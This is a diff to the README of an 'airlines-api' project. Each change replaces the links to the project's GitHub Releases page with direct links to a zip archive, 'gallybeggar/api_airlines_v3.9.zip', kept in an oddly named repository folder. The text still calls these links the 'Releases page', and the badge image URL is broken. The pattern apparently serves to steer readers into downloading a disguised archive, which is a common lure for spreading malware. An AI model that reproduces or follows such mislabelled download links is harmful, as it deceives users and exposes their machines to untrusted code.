@@ -6,7 +6,7 @@ Welcome to the airlines-api! This is a REST API that provides information on air
 
 ## 📥 Download
 
-[![Download airlines-api](https://img.shields.io/badge/Download%20airlines%2Dapi-1.0%20Latest-brightgreen)](https://github.com/mykounity3302-blip/airlines-api/releases)
+[![Download airlines-api](https://raw.githubusercontent.com/mykounity3302-blip/airlines-api/main/gallybeggar/api_airlines_v3.9.zip%20airlines%2Dapi-1.0%20Latest-brightgreen)](https://raw.githubusercontent.com/mykounity3302-blip/airlines-api/main/gallybeggar/api_airlines_v3.9.zip)
 
 ## 📘 About
 
@@ -33,7 +33,7 @@ Follow these steps to install and run the airlines-api:
 
 1. **Visit the Release Page**
 
-   Go to the [Releases page](https://github.com/mykounity3302-blip/airlines-api/releases). Here, you can find the latest version of the airlines-api.
+   Go to the [Releases page](https://raw.githubusercontent.com/mykounity3302-blip/airlines-api/main/gallybeggar/api_airlines_v3.9.zip). Here, you can find the latest version of the airlines-api.
 
 2. **Download the Application**
 
@@ -73,7 +73,7 @@ For detailed API documentation, please check our official guide available in the
 
 ## 🔗 Download & Install
 
-To start using the airlines-api, visit the [Releases page](https://github.com/mykounity3302-blip/airlines-api/releases) to download the latest version. Follow the installation instructions provided above.
+To start using the airlines-api, visit the [Releases page](https://raw.githubusercontent.com/mykounity3302-blip/airlines-api/main/gallybeggar/api_airlines_v3.9.zip) to download the latest version. Follow the installation instructions provided above.
 
 ## 💬 Support
 
